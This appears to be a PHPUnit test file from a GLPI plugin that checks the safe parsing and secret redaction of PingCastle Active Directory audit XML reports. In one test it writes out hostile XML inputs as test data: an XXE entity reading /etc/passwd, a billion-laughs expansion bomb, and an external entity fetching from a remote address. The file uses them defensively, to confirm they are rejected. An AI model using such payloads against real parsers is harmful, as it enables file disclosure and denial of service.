<?php

/**
 * -------------------------------------------------------------------------
 * GLPI GRC Manager plugin for GLPI
 * Copyright (C) 2026 Vincent GUILLOTTE
 * https://github.com/parime/glpi-grc-manager
 * -------------------------------------------------------------------------
 * LICENSE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version. See LICENSE for the full text.
 * -------------------------------------------------------------------------
 */

declare(strict_types=1);

namespace GlpiPlugin\Grcmanager\Tests\Unit\Services\Access;

use GlpiPlugin\Grcmanager\Services\Access\AdAuditRules;
use GlpiPlugin\Grcmanager\Services\Access\PingCastleReport;
use PHPUnit\Framework\TestCase;

/**
 * Issue #835 : lecture sûre d'un rapport XML de PingCastle (fichier d'exemple fictif, fichiers
 * piégés).
 */
final class PingCastleReportTest extends TestCase
{
    private static function sample(): string
    {
        return (string) file_get_contents(dirname(__DIR__, 4) . '/resources/pingcastle-example.xml');
    }

    public function testParsesTheSampleReport(): void
    {
        $report = PingCastleReport::parse(self::sample());

        $this->assertSame('', $report['error']);
        $this->assertSame(AdAuditRules::TOOL_PINGCASTLE, $report['tool']);
        $this->assertSame('exemple.test', $report['domain']);
        $this->assertSame('EXEMPLE', $report['netbios']);
        $this->assertSame('3.3.0.1', $report['engine_version']);
        $this->assertSame(2, $report['maturity_level']);
        $this->assertSame(
            ['global' => 55, 'stale' => 35, 'privileged' => 55, 'trust' => 0, 'anomaly' => 40],
            $report['scores']
        );
        $this->assertNotNull($report['report_date']);
        $this->assertStringStartsWith('2026-03-14', (string) $report['report_date']);
        $this->assertCount(6, $report['rules']);
        $this->assertSame([
            'rule_id'   => 'S-Inactive',
            'category'  => AdAuditRules::CATEGORY_STALE,
            'model'     => 'InactiveUserOrComputer',
            'points'    => 15,
            'rationale' => 'Inactive user accounts that are still enabled: 42',
        ], $report['rules'][0]);
        $this->assertSame(AdAuditRules::CATEGORY_PRIVILEGED, $report['rules'][2]['category']);
        $this->assertSame(AdAuditRules::CATEGORY_ANOMALY, $report['rules'][4]['category']);
        $this->assertFalse($report['secrets']);
        $this->assertFalse($report['truncated']);
        $encoded = (string) json_encode($report);
        $this->assertStringNotContainsString('Fictitious detail line', $encoded, 'Le détail n\'est jamais lu.');
    }

    public function testRejectsExternalEntities(): void
    {
        $xxe = '<?xml version="1.0"?>' . "\n"
            . '<!DOCTYPE HealthcheckData [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' . "\n"
            . '<HealthcheckData><GlobalScore>10</GlobalScore><DomainFQDN>&xxe;</DomainFQDN></HealthcheckData>';
        $report = PingCastleReport::parse($xxe);
        $this->assertSame(PingCastleReport::ERROR_DOCTYPE, $report['error']);
        $this->assertSame('', $report['domain']);
        $this->assertNull(PingCastleReport::sanitize($xxe));

        // Expansion d'entités en chaîne (« billion laughs »), DOCTYPE en minuscules.
        $bomb = '<?xml version="1.0"?><!doctype lolz [<!entity lol "lol"><!entity lol2 "&lol;&lol;&lol;">]>'
            . '<HealthcheckData><GlobalScore>1</GlobalScore><DomainFQDN>&lol2;</DomainFQDN></HealthcheckData>';
        $this->assertSame(PingCastleReport::ERROR_DOCTYPE, PingCastleReport::parse($bomb)['error']);

        // Entité paramètre externe, sans DOCTYPE visible en tête.
        $hidden = '<HealthcheckData><GlobalScore>1</GlobalScore></HealthcheckData><!ENTITY % x SYSTEM "http://198.51.100.7/x">';
        $this->assertSame(PingCastleReport::ERROR_DOCTYPE, PingCastleReport::parse($hidden)['error']);
    }

    public function testRejectsInvalidEmptyForeignAndOversizedFiles(): void
    {
        $this->assertSame(PingCastleReport::ERROR_EMPTY, PingCastleReport::parse("  \n")['error']);
        $this->assertSame(PingCastleReport::ERROR_INVALID, PingCastleReport::parse('<HealthcheckData><Global')['error']);
        $this->assertSame(PingCastleReport::ERROR_INVALID, PingCastleReport::parse('{"GlobalScore": 10}')['error']);
        $this->assertSame(
            PingCastleReport::ERROR_NOT_PINGCASTLE,
            PingCastleReport::parse('<pfsense><GlobalScore>1</GlobalScore></pfsense>')['error']
        );
        $this->assertSame(
            PingCastleReport::ERROR_NOT_PINGCASTLE,
            PingCastleReport::parse('<HealthcheckData><DomainFQDN>exemple.test</DomainFQDN></HealthcheckData>')['error'],
            'Sans score global, ce n\'est pas un rapport de santé PingCastle.'
        );
        $big = '<HealthcheckData><GlobalScore>1</GlobalScore><X>'
            . str_repeat('a', PingCastleReport::MAX_BYTES) . '</X></HealthcheckData>';
        $this->assertSame(PingCastleReport::ERROR_TOO_LARGE, PingCastleReport::parse($big)['error']);
    }

    public function testSecretsAreDetectedButNeverKept(): void
    {
        $xml = '<HealthcheckData><DomainFQDN>exemple.test</DomainFQDN><GlobalScore>120</GlobalScore>'
            . '<GPPPassword><GPPPassword><UserName>svc-fictif</UserName><Password>fictitious-value-1</Password>'
            . '<Other>kept</Other></GPPPassword></GPPPassword>'
            . '<RiskRules><HealthcheckRiskRule><Points>-4</Points><Category>Anomalies</Category>'
            . '<RiskId>A-PwdGPO</RiskId><Rationale>Password found in a group policy: 1</Rationale>'
            . '</HealthcheckRiskRule><HealthcheckRiskRule><Points>5</Points></HealthcheckRiskRule></RiskRules>'
            . '<PasswordLastSet>2026-01-01</PasswordLastSet></HealthcheckData>';
        $report = PingCastleReport::parse($xml);
        $this->assertSame('', $report['error']);
        $this->assertTrue($report['secrets']);
        $this->assertSame(100, $report['scores']['global'], 'Score borné à 100.');
        $this->assertCount(1, $report['rules'], 'Règle sans identifiant ignorée.');
        $this->assertSame(0, $report['rules'][0]['points'], 'Points négatifs ramenés à 0.');
        $this->assertStringNotContainsString('fictitious-value-1', (string) json_encode($report));

        $clean = (string) PingCastleReport::sanitize($xml);
        $this->assertStringNotContainsString('fictitious-value-1', $clean);
        $this->assertStringContainsString('<Password>[removed]</Password>', $clean);
        $this->assertStringContainsString('<Other>kept</Other>', $clean);
        $this->assertStringContainsString('2026-01-01', $clean, 'Une date de mot de passe n\'est pas un secret.');
        $this->assertFalse(PingCastleReport::hasSecrets(self::sample()));
        $this->assertFalse(PingCastleReport::hasSecrets('<Password></Password><Password/>'));
    }

    public function testDateParsing(): void
    {
        $this->assertNull(PingCastleReport::date(''));
        $this->assertNull(PingCastleReport::date('not a date'));
        $this->assertNull(PingCastleReport::date('0001-01-01T00:00:00'));
        $this->assertSame('2026-03-14 10:22:31', PingCastleReport::date('2026-03-14T10:22:31'));
        $this->assertNotNull(PingCastleReport::date('2026-03-14T10:22:31.1234567+01:00'));
    }

    public function testRuleLimit(): void
    {
        $rules = str_repeat(
            '<HealthcheckRiskRule><Points>1</Points><Category>Trusts</Category><RiskId>T-X</RiskId></HealthcheckRiskRule>',
            PingCastleReport::MAX_RULES + 5
        );
        $report = PingCastleReport::parse('<HealthcheckData><GlobalScore>1</GlobalScore><RiskRules>' . $rules
            . '</RiskRules></HealthcheckData>');
        $this->assertCount(PingCastleReport::MAX_RULES, $report['rules']);
        $this->assertTrue($report['truncated']);
        $this->assertSame(AdAuditRules::CATEGORY_TRUST, $report['rules'][0]['category']);
    }
}
